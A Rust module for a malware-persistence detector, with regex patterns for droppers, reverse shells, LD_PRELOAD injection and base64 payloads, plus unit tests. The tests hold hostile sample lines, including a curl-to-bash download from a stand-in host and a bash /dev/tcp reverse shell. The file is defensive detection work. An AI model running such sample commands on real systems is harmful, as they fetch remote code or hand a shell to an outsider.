//! What a new or changed persistence file actually runs, and whether that
//! looks like something malware would write.

use std::sync::LazyLock;

use regex::Regex;

/// Patterns common in droppers and persistence, rare in honest config.
static PATTERNS: LazyLock<Vec<(&str, Regex)>> = LazyLock::new(|| {
    [
        (
            "download piped into an interpreter",
            r"(curl|wget)[^|;]*\|\s*(ba|z|da)?sh\b|(curl|wget)[^|;]*\|\s*python",
        ),
        (
            "runs from a temporary directory",
            r"(^|[\s='])(/tmp|/var/tmp|/dev/shm)/",
        ),
        (
            "runs from a hidden directory",
            r"/\.[A-Za-z0-9_-]+/\.[A-Za-z0-9_-]+|\.cache/\.[A-Za-z0-9]",
        ),
        (
            "decodes an embedded payload",
            r"base64\s+(-d|--decode)|\bbase64\.b64decode|frombase64string",
        ),
        ("library injection", r"\bLD_PRELOAD\s*=|\bLD_AUDIT\s*="),
        (
            "reverse shell",
            r"/dev/tcp/|\bnc(at)?\b.*\s-e\s|socat\b.*exec:|bash\s+-i\s*>&",
        ),
        (
            "inline interpreter one-liner",
            r"\b(python3?|perl|ruby)\s+-(c|e)\s+.*(socket|exec|eval)",
        ),
    ]
    .into_iter()
    .map(|(why, re)| (why, Regex::new(re).expect("valid pattern")))
    .collect()
});

/// Lines that start programs, in the formats the watched files use.
static EXEC: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^\s*(ExecStart(Pre|Post)?|ExecStop|Exec|exec-once|exec|ProxyCommand|LocalCommand|hooksPath|fsmonitor)\s*[=\s]")
        .expect("valid exec pattern")
});

#[derive(Debug, PartialEq)]
pub struct Line {
    pub number: usize,
    pub text: String,
    /// Why the line looks malicious; `None` for a plain exec line.
    pub alert: Option<&'static str>,
}

/// Exec lines and suspicious lines, at most `limit`, alerts first.
pub fn scan(text: &str, limit: usize) -> Vec<Line> {
    let mut lines: Vec<Line> = text
        .lines()
        .enumerate()
        .filter_map(|(i, raw)| {
            let trimmed = raw.trim();
            if trimmed.starts_with('#') {
                return None;
            }
            let alert = PATTERNS
                .iter()
                .find(|(_, re)| re.is_match(trimmed))
                .map(|(why, _)| *why);
            (alert.is_some() || EXEC.is_match(trimmed)).then(|| Line {
                number: i + 1,
                text: trimmed.chars().take(120).collect(),
                alert,
            })
        })
        .collect();
    lines.sort_by_key(|l| (l.alert.is_none(), l.number));
    lines.truncate(limit);
    lines
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn flags_dropper_lines_first() {
        let unit = "[Unit]\nDescription=helper\n[Service]\nExecStart=/usr/bin/syncthing\n# curl x | sh\nExecStartPre=/bin/sh -c 'curl -s https://x.example/a | bash'\n";
        let hits = scan(unit, 10);
        assert_eq!(hits.len(), 2);
        assert_eq!(hits[0].number, 6);
        assert_eq!(hits[0].alert, Some("download piped into an interpreter"));
        assert_eq!(hits[1].alert, None);
    }

    #[test]
    fn recognises_common_persistence_tricks() {
        let cases = [
            ("export LD_PRELOAD=/usr/lib/libx.so", "library injection"),
            ("Exec=/home/u/.cache/.x/run", "runs from a hidden directory"),
            ("exec-once = /tmp/upd", "runs from a temporary directory"),
            ("echo aGk= | base64 -d | sh", "decodes an embedded payload"),
            ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "reverse shell"),
        ];
        for (line, why) in cases {
            assert_eq!(scan(line, 5)[0].alert, Some(why), "{line}");
        }
    }

    #[test]
    fn honest_config_is_quiet() {
        let rc = "alias ll='ls -la'\nexport PATH=$HOME/.local/bin:$PATH\neval \"$(starship init zsh)\"\n";
        assert!(scan(rc, 5).is_empty());
    }
}
